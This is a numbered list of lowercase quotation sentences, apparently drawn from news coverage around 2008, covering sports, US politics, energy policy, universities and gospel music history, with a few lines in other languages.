7540829 i dont care what people will say were doing it for the right reason and its transparent
7540830 in the given situation if the satellite is indeed out of control destroying it is the inevitable and right thing to do i think

7540903 my people london need to speak to their people redmond
7540904 i just wanted to make sure my mind was right
7540905 hes a guy who has been exactly the epitome of what we hope a trojan football player and student athlete would be
7540906 hes been a fantastic part of this team and its the stuff you guys wouldnt know about his work ethic and his desire to do everything he possibly can to be a great asset to this team in all ways on and off the field
7540907 anytime you come out here working as hard as we do on the practice field you take something out of it
7540908 its been emphasis the last few years especially for the secondary we want to get our hands on the ball and make big plays
7540909 its been very important to me we work really well together
7540910 we have a relationship on the field we have a relationship off the field how close we are off the field carries over to on the field
7540911 we work together i understand what hes doing and he understands what im doing it makes it a lot easier for us to go about our stuff in a professional way
7540912 theyre always pretty aware of how hard were going coach carrolls been doing this a long time he understands where were at and how our legs feel
7540913 i dont know how to compare it to other camps theyre always different its hard to remember how the last camp even was
7540914 the only news ive got is that both of them will play
7540915 ive never had anything like it before to where youve got two quality d i quarterbacks that are both good leaders both good players
7540916 neither one of them ever wilted under the pressure theyve both gotten better
7540917 the snaps and how they alternate the snaps they do that between themselves
7540918 i just make sure by the end of the week theyve all got the quality of reps that they have to have
7540919 when i look out there on a certain day and see who goes first on a certain drill they decide that every day for themselves
7540920 i think the best person for the offense thats who we should play
7540921 everybodys got their own opinions on it im not really going to say mine
7540922 i think everybody can pretty much see who should be the guy out there it doesnt really matter as long as our team wins the national championship
7540923 hes a very similar ball carrier and very similar good person but i feel like hes a much more mature and will be a much more patient running back at the beginning of the season
7540924 the last half of last season he was a very patient running back when it was his turn and the big play came to him he made it he wasnt anxious to go make the play like he was earlier in the season
7540925 one hes done it his expectations of himself have come to fruition but he also has much more confidence with the whole scene hes much more confidence in the guys that are blocking for him and where theyre going to be and when
7540926 no hes 100 percent physically and beyond 100 percent mentally
7540927 if you can get to the fourth quarter ahead and are willing to hand him the football and not have the alumni crow that youre too conservative you got a chance
7540928 im sure dan herron will be 100 percent he got bumped a little bit but he had gotten a lot of reps before that
7540929 brandon saine i think will be 100 percent on the health side but he wont be 100 percent yet on the preparation that goes along with just being out there sloshing around having the ball in your hands and reacting to the speed thats out on the field
7540930 hes such a good athlete that wont take long to recover what hes missed
7540931 dan herron is a good football player tough and a good running back even at a school like the ohio state university you dont have so many guys that you cant plan on using the good players
7540932 brandon saine will be ready to go 100 percent but not 100 percent as a tailback at this point his health is going to be fine but hes not going to have had any reps fitting in with those other five guys in front of him
7540933 hes the perfect candidate for special plays and special teams so that wouldnt surprise me to see him back there
7540934 jermil is a thick strong guy he has a variety of experiences coming of high school one of which was carrying the football
7540935 certainly you could conceive of a situation where you want a big strong back to crash up in there and make sure you fall forward and take some hits off some other guys

7540950 some very rapid adoption particularly for children in the age range of 10 to 13

7540952 the reason we call it gps phone locator is that its intended to locate the phone not necessarily a person
7540953 its an important distinction because these are useful tools but we dont believe they substitute for really being in touch with your child and other things that we should do for the safety of our children
7540954 these services ours and everyone elses only work if the phone is turned on theres no bypassing that
7540955 were seeing adults using it with their elderly parents just to make sure mom or dad didnt get lost when they were driving to their doctors appointment that kind of thing

7540965 the way the military sees it if youre in the cargo hold of an airplane at high altitude and then drop by parachute to a hot desert that would be a temperature shock situation
7540966 dust and humidity is dealt with in a couple of ways
7540967 it cannot only survive drops to concrete but also constant jouncing in the back of a jeep
7540968 if the systems fall the drive wont get the full shock
7540969 the ssd flash drives are far more stable and less prone to error and read problems than a spinning platter drive would be
7540970 they have accelerometers that can tell if it is falling so it can remove a drive head from the disk so any shock that occurs wont damage the surface
7540971 its really hard to get that drive arm to dig into the surface even though they are floating microns above the disk to read the data to get them to go that extra bit takes quite a lot
7540972 panasonic engineers have developed special materials including proprietary super sheet technology as well as other forms of padding used in shock mounting to protect these drives in the extreme environments in which they work
7540973 we have deployed ssd based toughbook notebooks in the most extreme vibration environments such as for example helicopters where vibration is a significant risk
7540974 these things are not dainty theres a large heat envelope
7540975 they can also have doors that can be opened and closed or port covers you can open to run them in a way thats not fully locked down but then seal it all back up

7541020 i think what unifies the party is george bush i mean we dont need four more years of george bush and i think everybody understands that though there might be disappointment
7541021 i dont think it in any way diminishes senator obama but i also think it also sends the sign of respect to senator clinton that she deserves

7541029 we are indeed distressed that our previous analysis of this issue was in error
7541030 i cant provide odds on whether dropped votes were not recognized
7541031 but based on what we know about how our customers run their elections and reconcile counts we believe any results not uploaded on election night would have been caught when elections were being certified
7541032 voters in jurisdictions premier serves both in ohio and throughout the country can be assured that election officials employing standard canvass and crosscheck procedures will count their votes completely and accurately

7541034 the problem with vote counts is most likely to affect larger jurisdictions

7541036 oh well we have no way of verifying any votes on any of these machines sorry who knows what the actual election results were sorry please drive to your nearest wal mart buy something new and shiny at the expense of foreign slave laborers and just forget about it

7541055 wir stehen kurz davor unsere gute letzte saison zu kr nen aber wir wissen dass wir genauso entschlossen zu werke gehen m ssen wie im hinspiel in turin
7541056 wir treffen auf eine mannschaft die hei darauf ist vor eigenem publikum ein gro es spiel abzuliefern deshalb wird es nicht leicht f r uns
7541057 ganz offensichtlich stehen wir mit einem bein in der gruppenphase doch wir d rfen nicht vergessen dass unser gegner vor drei jahren in der qualifikation zur uefa champions league mit 5 0 gegen celtic fc gewonnen hat
7541058 wir sind zufrieden ber die art und weise wie wir in turin aufgetreten sind aber wir sollten nicht allzu viel ber dieses resultat nachdenken

7541080 u s homeowners increasingly failed to keep up with their home loan payments in november as the number of foreclosure filings surged 68 percent nationwide compared with the same month a year ago according to a mortgage research company in all 201 950 foreclosure filings were reported last month compared with 120 334 in november 2006 irvine based realtytrac inc last months filings fell 10 percent from octobers 224 451 the last time there was a sequential drop in foreclosure filings was between august and september when they fell 8 percent the u s had one foreclosure filing for every 617 households in november realtytrac said
7541081 the filings include default notices auction sale notices and bank repossessions some properties might have received more than one notice if the owners have multiple mortgages forty three states saw an increase in foreclosure filings over last year
7541082 the comparisons are outrageous unacceptable and crudely divisive all at the same time
7541083 it clearly shows that when it comes to supporting barack obama his fellow worldwide celebrities refuse to consider any smear or attack off limits

7541089 japanese soldiers in the south pacific still fighting after the war is over
7541090 obama needs to tell us in 10 words or less at wal mart how he intends to improve our lives
7541091 this looks like a step backward for obama who had a 51 to 44 percent advantage last month
7541092 even last week just before his choice of joe biden as his running mate became known most polls tended to show obama with a single digit advantage over mccain
7541093 the number of clinton democrats who say they would vote for mccain has gone up 11 points since june enough to account for most although not all of the support mccain has gained in that time
7541094 its not that theres anything wrong with the choice of joe biden a majority rate the biden selection as excellent or pretty good voters think he is qualified to be president and with the exception of al gore in 1992 the public ranks biden as the most qualified running mate in recent times
7541095 a lot of americans dont know who he is but his favorable rating is 13 points higher than his unfavorables but biden is not hillary clinton and its possible that is enough to have moved some of her supporters away from the democratic ticket at least temporarily

7541101 its not so much a gift from my wife or myself it is a gift from a child see to it that it is the childrens park
7541102 i thought it would set us back 50 years if i didnt win that match
7541103 it would ruin the womens tour and affect all womens self esteem
7541104 most important perhaps for women everywhere she convinced skeptics that a female athlete can survive pressure filled situations and that men are as susceptible to nerves as women
7541105 she has prominently affected the way 50 percent of society thinks and feels about itself in the vast area of physical exercise
7541106 moreover like arnold palmer she has made a whole sports boom because of the singular force of her presence
7541107 she was a crusader fighting a battle for all of us she was carrying the flag it was all right to be a jock
7541108 i knew after my first lesson what i wanted to do with my life
7541109 my heart pounds my eyes get damp and my ears feel like theyre wiggling but its also just totally peaceful
7541110 its almost like having an orgasm its exactly like that
7541111 in the 70s we had to make it acceptable for people to accept girls and women as athletes
7541112 we had to make it ok for them to be active those were much scarier times for females in sports
7541113 it actually had an impact on king cited the largest attendance ever for both the mens and womens professional tours in 1974 the year following her match with riggs and which has been attributed directly to it
7541114 its funny how when a woman does something they always think we only affect half of the population
7541115 i think people perceive women that way all the time and thats not good if you effect one human being i think its a domino effect it changes the puzzle the framing everything
7541116 also what came from this match is the first generation of men of the womens movement because i have men coming up to me today that have daughters and they have tears in their eyes and they tell me how that match they were ten years old 12 years old 17 years old and how that match changed their life and how they raised their daughters theyre the first generation of men that truly believe that their daughters and sons should have equal opportunity
7541117 equal pay has been the law since 1963 but today nearly 45 years later women are still paid less than men even with similar education skills and experience
7541118 additionally the practice zone will significantly help students improve their test scores many students feel a great deal of anxiety around test taking to help alleviate this and build academic confidence
7541119 but we have to wait a year then our credit will be good enough to get the best interest rate
7541120 the aggressive sites are doing well other places arent doing so well
7541121 with high gas the economy a housing crisis people are not feeling wealthy
7541122 the good news is weve only had two vacant rooms in august so far were basically almost dead even with last year which was our best year ever in 121 years
7541123 people who would have driven to cedar point or chicago are more likely to stay local
7541124 we decided to stay closer to home because of finances
7541125 were pleased to be where we are but were guarded about 2009 with everything going on in the world today were hoping people will continue to visit and choose to spend their money on us
7541126 in the recent situation involving then attorney general marc dann fellow democrats waited until dann publicly admitted certain wrongdoing before calling for his resignation i call upon democratic leaders governor ted strickland board of commissioners president peter lawson jones and commissioner tim hagan to show some courageous leadership on behalf of our citizens and join me now in calling for dimora and russo to step down
7541127 when i got here in 2001 we were at the very edge of playhouse square but had virtually no contact and that made absolutely no sense whatsoever given our location and the voracious appetite for theater in northeast ohio
7541128 it the allen really would be a national theater center we the csu dramatic arts program would be part of the playhouse square machine as far as publicity and box office go as exciting as all of that is we would then be in partnership with the great lakes theater festival it would really be a win win for both the festival and the department
7541129 people are going to want to come to see the new spaces and see what is happening as we grow as a program which we have done over the last few years people will be excited to come there the allen will help bring people just the fact that we will be a part of a dynamic theater area for the student there is going to be this synergy students will be exposed to the theater district and perhaps become a part of some other projects going on the public will then start seeing more of our students in various capacities
7541130 to be quite honest the factory theater is not an exciting place it is kind of off the beaten path the lobby isnt particularly inviting the space is nice and weve done a lot with it but the space is not as nice as some of the other venues people go to
7541131 the allen is a nationally if not internationally recognized theatrical compound it has incredible visibility it really links both csu and the csu theater arts program with the renovation of downtown cleveland
7541132 and then we continued blissfully into this small but perfect piece of our forever
7541133 has chosen to dwell in the netherworld of bizarre conspiracy theories
7541134 i use it to clock in to work on campus and to do that you now have to put in your information twice instead of once as the old site was designed that is rather annoying
7541135 theres no words to describe how i feel for what has happened all i want to do is see that justice be done
7541136 it would be illegal for anyone to be arrested while they were proceeding to parliament
7541137 andere landen beseffen dat dit een sleutelelement is om concurrentieel te blijven en voeren de kwaliteit van hun onderwijs op

7541140 i have come to learn a lot during the few months i have been working at the sandton station and the skills i have acquired will definitely help me in future long after the construction of the gautrain is complete
7541141 there are 9 501 people working on the 52 sites of the gautrain about 93 percent of these people are local
7541142 the gautrain project is not a transport project only it is also meant to stimulate investment and economic growth create jobs and redress economic inequalities inherited from the past
7541143 the gautrain will not only change the face of the provinces landscape but will bridge the critical skills gap training that is being provided by international companies like coach manufacturers bombardier to our local people will contribute to the development of our skills base

7541153 because weve already had a referendum on this issue i think the people will have to be consulted
7541154 the government is involved in detailed research to isolate the specific matters that were most sensitive in the minds of voters as we went to the polls on 12 june those matters then have to be addressed
7541155 towards the end of the year well have to decide what our timetable is
7541156 we cannot exclude the possibility that at some stage and in the right circumstances it may be necessary to consult the people again
7541157 its outrageous all of this its designed to intimidate us

7541159 well i dont know them youll just have to keep an eye
7541160 this is all designed to ensure the safety of everyone here
7541161 they should have told the city the people who live here they were going to do it

7541167 it feels like ive been here for the past 20 years there are so many familiar faces
7541168 what will be my adjustment from men to women everyone has their theories but in my opinion i think it will be the same
7541169 i hope to help in every aspect of the basketball program
7541170 she really convinced me that this is something i really wanted to be apart of
7541171 i am just thankful that it is kate someone that i respect as a person and as a basketball coach
7541172 i havent seen any losing expectations in any of our girls from the seniors down to the freshmen
7541173 i was not here very long as the interim but it was clear to me that this was a first rate faculty and that this could become a very very competitive and very much a first rate university and theres no reason it shouldnt be
7541174 i was really motivated to come here as interim not to become president but once i was here i just realized that to be part of this place was terrific
7541175 the culture of timidity has to go let us pledge now and in this place that we shall strike out in bold new ways and create a new cleveland state university let us agree that the stories of lost opportunities will end for us now
7541176 commuter value is very important but campus culture is generally built by the resident student body
7541177 because theyre here they have a great stake in it they develop their own traditions their own history their own needs and interests
7541178 ive made a number of changes that i think are important but lets let the historians decide
7541179 we had to do some things here that were just fundamental i think the admission standards make a big difference and our classes subsequently have been better less than a year ago we were told you guys are crazy nobody will come there but the freshman class got bigger it got academically better and it got more diverse
7541180 to tell you the truth ill miss it all i think its a very exciting time in the history of this university there are lots of changes taking place some i think are very good and long overdue
7541181 their most important responsibility is the responsibility to pick a president
7541182 the way that the chairman of the board has constructed the search committee is really very impressive it is a first class search committee so im not that worried about it
7541183 in my opinion determining the right time to leave is the most important and difficult part of the job of course it is always best to leave when you are on top of your game but it is when you are on top of your game that you least want to leave
7541184 this is a university that is really developing very quickly changing around
7541185 after awhile you get the sense that somebody who can step back and look at look at it with new marrow and make a fair assessment of where it is and where it needs to go would probably be good
7541186 now is the time for new vision new energy new ideas and new skills
7541187 i am very pleased with the new members governor strickland appointed
7541188 each one of them will help us carry out the goals we have for the university and the vision president schwartz has set out for cleveland state
7541189 our first duty is searching for the new president of the university
7541190 with president schwartz retiring in july of 2009 the new members and existing members will be involved in the selection process of a new president right away
7541191 the next objective is staying supportive of schwartz plan for the future
7541192 many positive things are going on right now at cleveland state because of schwartz and the board wants to continue moving in that direction
7541193 our final objective is enhancing the importance of higher education
7541194 the new members will help us in trying to fulfill all the goals we have set as a committee
7541195 one thing we are really pushing for is becoming more collaborative with the cleveland clinic
7541196 dr dicorleto is currently the community trustee and does not get a vote however he is a very big part in us working together with the cleveland clinic
7541197 it is uncommon to have three new members come in at once
7541198 the positions needed to be filled because mr cavanagh took a job in washington carl glickmans term had expired and mr machaskee had resigned
7541199 i think that if we work hard and stay healthy weve got a chance to do great things this year
7541200 you cant look down the road and look at the championship
7541201 you cant think its in the bag we have to take it one game at a time again this year
7541202 the young girls are going to give us a bit of depth and the five freshmen have created a great deal of depth for our team
7541203 this is this the first time in awhile we are an experienced team
7541204 this is a difficult schedule that is designed to get us ready for the league schedule in january and put us into a position to have an rpi that will be deserving of a postseason bid
7541205 were going to get a real challenge especially right at the beginning
7541206 playing teams like washington kansas state richmond and west virginia will help us become a better team
7541207 everyone on this team is taking a veteran approach and that in itself is a plus
7541208 we wont be able to sneak up on anybody this year
7541209 everybody will be prepared for us so that will make every game just a little more difficult

7541433 dan sesungguhnya kalau kami kurniakan kepada manusia nikmat kami kemudian kami tarik kembali daripadanya sesungguhnya dia menjadi putus asa dan menjadi kufur
7541434 dan sesungguhnya kami perintahkan kepada adam dahulu maka dia lupa perintah itu dan tidak kami dapati padanya kemahuan yang kuat

7541461 its simply common sense that the government should allow student houses to count towards the target the new purpose built accommodation means that students will move out of the houses in the most affordable areas of our city can the government really not see the benefit of this

7541584 demonstrate the breadth of our party and the different kinds of people who make up our country and have found a home in the democratic party because it represents their values
7541585 we were sniffed by dogs wanded by agents and put through metal detectors its all part of the deal of covering such an event
7541586 i think its a great selection i think it gives great balance to the ticket
7541587 saturdays announcement confirms what america already knows barack obama is not ready to be president biden himself has said hes not ready to be president
7541588 an immensely talented person whos got a long track record with foreign policy and lots of different areas so we couldnt be happier with the choice
7541589 i think there will be delegates present but not the legislators in this case
7541590 i think its unfortunate but its necessary our number one priority is the budget
7541591 jeez kevin calling you an asshole would be a huge understatement wouldnt it
7541592 as a result the way they make decisions is to find out what their peers think and reach a consensus theyre not into expert wisdom and people with long resumes theyre much more likely to respond to messages in social networks like myspace or facebook than to traditional campaign messages
7541593 barack obama wants universal access to health care but does not want to nationalize the health insurance industry
7541594 they millenials tend to favor government intervention in the economy
7541595 they tend to be multilateralists in foreign policy they tend not to be concerned with social issues those things are decided for them theyre not upset about gay marriage for example

7541601 politics is not the art of the possible it consists in choosing between the disastrous and the unpalatable
7541602 youre saying that politics and economics are the same thing
7541603 the different between the tabloids and the broadsheets is the subtley in telling you what to think
7541604 but what does their shoes have to do with anything apart from undermining their political credibility
7541605 all right well both read a different paper every day and see

7541616 as blogger and cpu architect peter glaskowsky said the large larrabee in 2010 will have roughly the same performance as a 2006 gpu from nvidia or ati
7541617 weve looked very closely at this and we know there are certain things we can do better there will be improvements to things from all angles there are some easy fixes in the software domain that will soon be forthcoming believe me its a very prime focus of ours
7541618 were forward looking and sometimes when someones forward looking they get a little bit ahead of the game and thats kind of where we are
7541619 tal vez haya tiempos mejores pero ste es el nuestro
7541620 the sound quality on many of these interviews im sending you recorded on a cheap machine with budget tape nearly thirty years may make listening to these conversations difficult but the testimony itself and the singing are mighty fine and should hopefully make this project worth your and your readers time
7541621 now let me try to explain this as a kid and going to the churches when i was still in north carolina there was an old man called obadiah and uncle obie thats what everybody used to call him he must have come directly from africa or either he was the second generation out because in the mornings he would get up and he would come out call himself waking up the neighborhood and he could practically do it too had a voice that carried just like a bullhorn and he would get up in the mornings and hed go whoo whoo wheet whoo haah one of those things and he would do that several times and people inaudible phrase obies up time for us to turn too and he used to go to the church where i was going at the time as a kid and he would be how would you put it you know how the chiefs of the african tribes would narrate happenings and that sort of thing but all of his things was things from the bible he would sing them with some type of rhythm behind then i think thats what got me on the rhythm kick because he had such a natural rhythm you know and hed have just before the services before the preacher got i never shall forget it old reverend arnold that was his name just before the preacher would start to preach old uncle obadiah would get up and hed start to walking the aisles and he would start sings a hey hey hey and hed say and a ha ha ha and then the sisters would take it a hey hey hey and hed say and a ha ha ha then he would say come along children do come along shuffle up shuffle up a hey hey hey that was the answer and this beat sort of got into you after a while and all of the things that he used to sing really started like that they would start down here and they would keep moving up until they really got into a frenzy of a beat and i guess thats about what attracted me to it
7541622 with this quartet what we tried to create was what i used to call vocal percussion it was vocal percussion it was just like a drum but it had notes to it it had lyrics to it and you had different beats you had different accents you would accent it here accent it here but whatever was done was done together so what i used to call it percussion it was really a vocal percussion and that is what it had to sound like and it all had to be done sharply and together and i think that is what made along with the harmony and we sang simple chords the simple triad the furthest away we got from the simple triad perhaps would be a diminished chord we sang minor sevenths and thats about as far as we got we were trying to sing chords that sounded good to the ear and in some places in some of the songs there would be only two parts but it went so fast you couldnt hear it and the obligatos were like henry owens would take an obligato hed sing in the cracks but it fitted in because he slid from the key from the note to the crack to the note to the crack and home most of his moans if youre listening to a lot of things he does when hes moaning behind there hes dead in the crack in most instances
7541623 thats why with the golden gates style when you took the bass out you had nothing there the bass was the percussion that kept it going like in things that hes talking about there the bass started of with the percussion beat in the case of my walking stick the bass started up sings whump whump whump whump whump without my walking stick this is what he is talking about in the percussion when you had that percussion beat there the other three voices could do anything around that they could make any cutoff they could make any chop they could make any hole what the other people dont realize is its not actually a hole there because the percussion is still going on the beat is going on but the other three voices are not there at that particular time it is after that whump daah whump daah de doo dah whump daah da de dah you see they are filling in everything that has to be filled in
7541624 uh huh theyre filling in instead of the bass singer trying to fill in
7541625 langford had an important part in this i will say this langford was such a rhythmic cat that he would amaze all of us in some of the things that he could do he would do some kick ins some time that bill johnson would stop and laugh say pocket you really got it he would be amazed that langford would kick in like that you know sometimes he would say excuse the expression that i use highpocket there is really kicking us in the ass and thats the way it was you know
7541626 thats what it is with the gates its movement the thing has to be propelled forward
7541627 yeah but langford has such a sense of rhythm of filling in a spot and he had the imagination that he saw the spot before we could get to it that it would be vacant and he is there
7541628 the readiness towards the hosting of 2009 confederations cup by rustenburg host city and royal bafokeng is going on well

7541640 el verdadero amor es el amor puro altruista que no espera recompensa hacia todos los seres vivientes consider ndolos encarnaciones de lo divino

7541642 por estar inmersos en los pensamientos de relaciones impermanentes estamos perdiendo de vista el amor divino eterno e inmutable
7541643 la naturaleza del amor divino debe ser comprendida aun en la vivencia de las relaciones temporales
7541644 aun si los padres naturales est n ausentes uno no debe olvidar a los verdaderos padres la verdad y el amor

7541652 it would be illegal for anyone to be arrested while they were proceeding to parliament
7541653 zanu pf are in a desperate attempt to try and stop or abort our victory
7541654 we have taken this decision after we failed to find any ray of hope and none of the commitments made to us were fulfilled
7541655 this situation forced us to withdraw our support and sit on opposition benches
7541656 continue struggle for restoration of judges and genuine democracy in pakistan
7541657 we have requested saeed uz zaman siddiqui to accept our offer to become presidential candidate
7541658 he is a good pakistani who is a non partisan person
7541659 the ppp even nominated zardari for president and announced the election schedule without consulting our party
7541660 there is an agreement between the two sides that there will be no foreign soldiers in iraq after 2011
7541661 there is a provision that says the withdrawal could be done even before 2011 or extended beyond 2011 depending on the security situation
7541662 neither abkhazia nor south ossetia will ever again live in one state with georgia
7541663 its reasonable to discuss already today the transdniestr problem i see good chances for solving it
7541664 how dangerous such so called frozen conflicts can be given that the georgian leadership as they say went crazy
7541665 this is a serious warning for us all it is in this context that we should view the question of transdniestr resolution
7541666 right after the conflict with georgia russia would look very indecent if it immediately annexed south ossetia and abkhazia
7541667 i know the area but i also know there aint no circus there
7541668 im telling you there is one i was just there
7541669 and your dead father is there working as a clown you been drinkin boy
7541670 yes i know it sounds crazy his name was adam rich he used to live around here
7541671 please just take me there ill prove it to you
7541672 your father died here left no instructions as to what he wanted done with his body so we put him here the stone was a left over from some stones made for kids
7541673 he wanted me to find his body the clown suit was telling me what to look for
7541674 he wanted his body buried in our family plot he wanted to come home
7541675 senator chambliss im fed up with congress ignoring the will of the american people stop playing politics and act on the will of the people weve been demanding that you drill and use our 3 trillion barrels of oil we need other resource avenues that the last three administrations havent addressed stop the partisan politics and pass the will of the people the american people do not want a socialistic society period fix the problem
7541676 senator chambliss please do something about the gas prices im a stay at home mom and with raising the family on one income the price of gas is cutting us short on our needs something needs to be done soon were having to cut corners on a lot of different places in order to afford gas to and from work everything is increasing except wages we both have a college education and drive fuel efficient cars but the money we bring in just isnt stretching far enough
7541677 this critical legislation has been the subject of many negotiations and although the legislation is not perfect i am pleased with the bipartisan nature of this compromise bill
7541678 its unfortunate that the democratic majority found a way to extend authorization for the federal aviation administration but given the chance to extend the current medicare fee levels they objected twice
7541679 doctors and seniors deserve a serious and responsible effort that addresses the impending fee cut without playing politics and creating a major expansion of entitlement spending i will continue to work to provide doctors the relief they deserve and seniors the benefits they deserve
7541680 i am very pleased the administration is giving congress more time to work out reasonable legislation to eliminate this 10 percent cut in medicare payments to doctors i will do everything i can to see to it that the senate quickly passes a bill that helps georgia doctors and that helps georgia medicare beneficiaries especially our seniors and those who live in rural areas
7541681 its not just what 10 of us think we can do its also whats going to be possible with the white house and or with the leadership
7541682 it may be minimal but thats ok if it is
7541683 kent we agreed on so much on the farm bill and i gotta believe that there is a lot we agree on energy
7541684 and we started talking about it and there is theres an awful lot and we agreed that there are a lot of democrats and republicans that think like we did
7541685 hopefully we can work something out on a bipartisan basis i will certainly try
7541686 instead of proposing legislation which will just add more to the 68 million unused acres i think we should try something that might be a little better than that
7541687 was to narrowly craft something that could make a difference and appeal to democrats
7541688 who are open to doing something on the production side
7541689 it depends on whether youre interested in leading or whether youre interested in the politics of the issue
7541690 weve had solutions out there that have been blocked by republicans
7541691 the reality is the reality their obstinance and intransigence is going to cost them
7541692 pathogenic mitochondrial dna mutations are common in the general population
7541693 the storms and tornadoes that hit southwest georgia last year took a tremendous toll on the americus area and severely displaced a critical medical facility that so many folks in the area rely on it is imperative that the federal government provide all the assistance it can to continue the rebuilding process and ensure that georgians who live in this area have access to the quality health care they deserve
7541694 i am pleased that the air force has taken this step to provide quick access for subcontractors and other parties affected by these projects
7541695 i will continue to work with the air force to help local subcontractors recover their losses in relation to these projects and will work to ensure that the necessary houses are built and available for the airmen at moody air force base
7541696 i believe this effort epitomizes what the united states senate is all about
7541697 nothing gets done in this body without 60 votes and you dont get 60 votes without a true bipartisan effort this has been a cooperative effort on the part of all of 10 members this has not been easy and it has been very difficult at times but the discussion has always taken place in a very professional way even though sometimes its been in a very direct way it is my hope that when we return from the august recess our colleagues in the senate after having just spent time at home with their constituents will come forward to support this effort
7541698 ive said for weeks that america has within its reach every resource necessary to be self sufficient when it comes to energy we just need the political will and the common sense to make it happen
7541699 well when good people sit down with good intentions they come up with good ideas there is no silver bullet when it comes to reducing the cost of energy but senators chambliss and conrad have done an outstanding job leading this group to a number of solutions that i believe can work together to alleviate this crisis
7541700 i applaud the presidents announcement today and i am hopeful it will put even more pressure on congress to address the current energy crisis the presidents move is an important step in signaling to the world community that the united states is indeed serious about energy independence make no mistake however congress ultimately has to take action too if the congressional ban is to be lifted so that production along the outer continental shelf can take place georgians continue to tell me that their family budgets are being squeezed due to the price of gasoline and they are rightly furious with the lack of leadership in washington an overwhelming majority of americans support drilling here at home and it is time to put the wheels in motion simply put georgians want us out of this mess and it is my hope that our bipartisan group will be successful in crafting meaningful legislation that both parties can support
7541701 the rising cost of energy is the number one issue i am hearing about from georgians and the effect these costs are having on family budgets is very real and very urgent
7541702 this is a complex issue but we cannot shy away from action we should not play politics with such an urgent crisis we must come together to act now that is what georgians want and it is what we as policymakers want
7541703 our country is in serious danger because of skyrocketing energy costs this growing crisis demands urgent action
7541704 no single political party can solve our energy crisis the time for delay is over we need to work together to face our energy challenges head on and secure a more energy independent future
7541705 for too long congress has let partisan politics block good energy policies
7541706 it is time for congress to put these differences aside find real solutions and put america back on a path toward energy independence i join my colleagues in calling for an emergency energy summit so we can begin to turn this energy crisis around
7541707 todays high gas prices illustrate that our dependence on foreign sources of energy endangers both our homeland security and our economy
7541708 congress must come together move past endless partisan posturing and take action but action must be rooted in knowledge and far too many come to the debate listing only to interest groups that feed a political agenda a bipartisan commitment informed by balanced expertise will allow congress to move forward with commonsense energy policy that combines increased domestic production with an investment in alternative technologies
7541709 american families are feeling the pain of our growing energy crisis
7541710 gas is at 4 a gallon now is the time to come together to create real solutions that will produce new domestic sources of energy our nation desperately needs to become more energy independent and this summit is a step in the right direction
7541711 without a doubt americans are in desperate need of relief from high energy prices
7541712 nowhere is that felt more than in arkansas and other rural states across the country americas reliance on foreign oil is not a sustainable strategy i believe our country should focus on a long term investment strategy that includes renewable and alternative energy sources which will pave a road to energy independence and we must act now
7541713 there are no quick fixes in dealing with this issue but there are things we can and must do
7541714 with skyrocketing gas prices it is absolutely critical for congress to act now and act boldly holding an energy summit to hear from the experts on energy policy is a positive first step in moving towards a bipartisan solution
7541715 partisan bickering will not lower gas prices or put us on a course toward energy independence
7541716 we need to really sit down and talk about all the options on the table evaluate their merits and move full speed ahead on meaningful reform
7541717 the energy challenges facing our country cannot be solved without bipartisan commitment and cooperation
7541718 i am pleased to be part of an effort to bring together the best ideas of both parties and am anxious to move our country forward with balanced legislation that makes us more secure
7541719 no matter their politics all americans are feeling increasing pain from rising energy costs and we in congress need to start working together now to find solutions to this crisis
7541720 a bipartisan energy summit is a good first step on the road to move us toward more energy security and independence
7541721 develop more effective tools to systematically evaluate competition and efficiency opportunities across state government
7541722 im pleased this bill supports our men and women in uniform who are deployed in defense of freedom and gives them the resources they deserve and need to accomplish their mission
7541723 our servicemen and women make sacrifices every day so that we can live in the safest most secure nation in the world
7541724 im pleased we were able to provide this funding so that all of our soldiers have the resources and tools they need to complete their missions
7541725 the montgomery g i bill can change lives it has given countless members of our military access to the college education they otherwise would not have been able to afford
7541726 our nations military and their families have sacrificed tremendously so that our nation can live in freedom it is important we modernize education benefits for our military to ensure that our servicemembers veterans and members of the national guard and reserve receive the education benefits they deserve
7541727 this legislation will greatly expand educational benefits available to servicemembers
7541728 when congress tackles issues of such complexity we must make certain that we do not ignore the potential unintended consequences that i believe will result from this approach
7541729 we simply have not had the opportunity to fully explore the possibility that implementation of this legislation could have negative impacts such as driving the price of crude oil up further the real issue is that factual data is lacking in this debate which unfortunately allows everyone to paint the picture convenient for their cause
7541730 i am not opposed to all aspects of this bill rather i believe many of the components designed to yield more transparency in these markets are necessary
7541731 we must ensure that the information both the regulators and congress use to ensure proper oversight is accurate to warrant our actions but this language goes far beyond what i consider reasonable a reasonable market oversight component could be developed as part of a bipartisan comprehensive package but unfortunately this approach is only distracting us from developing more reasonable and balanced legislation
7541732 the commission has recognized that more information is necessary to ensure that speculation has not become excessive and i agree with them
7541733 this is not an overly ambitious proposal and does not go as far as i would like to see it go if there is a vote for anwr it wont get the votes to pass but ill vote for it
7541734 our compromise is the only possible bill that might get passed
7541735 senator john mccain had an issue the republicans could embarrass democratic presidential candidate barack obama with and perhaps ride to victory because the mass majority of the american people want to do the opposite of what the democrats do so nobody can figure out why compromise with the democrats and cut the knees off of senator mccain
7541736 we didnt get sent to washington to create political issues we were sent to washington to solve problems
7541737 if we solve problems they political pundits dont have a controversy to focus on
7541738 i saw the absolute devastation of the tragic explosion at the imperial sugar facility firsthand from the start of this investigation it has remained my position that it is congresss job to understand fully the fundamental cause of this disaster so we can help prevent future tragedies
7541739 oshas citation that imperial sugar egregiously and willfully violated safety and health standards is a severe charge we will hold a hearing in the senate next week to get all the facts on the table i look forward to hearing imperial sugar explain its position and to the testimony from all of our witnesses
7541740 these are very serious charges and the families of those whose lives were lost and those who were injured as a result deserve answers
7541741 senator isakson and i requested an investigation into this matter and next weeks hearing is critically important as we move forward in the process of determining why this happened and what measures can be taken to ensure that it doesnt happen again
7541742 im happy to see them come down id like to see them go lower
7541743 id like to see it go down to two dollars but thats not going to happen anytime soon
7541744 the only way you get things accomplished is to do so in a bipartisan way because you have to have 60 votes and i did reach out to democrats to see if we couldnt find some common ground
7541745 weve seen prices start falling weve seen the price for a barrel of oil decrease by about 20 percent since the president made his statement since we came out with our proposal
7541746 i think thats great he should just continue to go forward with it and hopefully make progress with it and bring the prices on down
7541747 if we dont solve the problem we will be paying 6 to 8 per gallon for gasoline
7541748 and it is only 72 miles from the existing alaskan pipeline

7541750 there are some hard and tough decisions to make there he has heard predictions that by 2015 social security will pay out more in benefits than it is taking in and that new recipients born after a specified time are being advised that their benefit will be 78 percent of expectations
7541751 i am pleased to announce this funding for the university of georgia
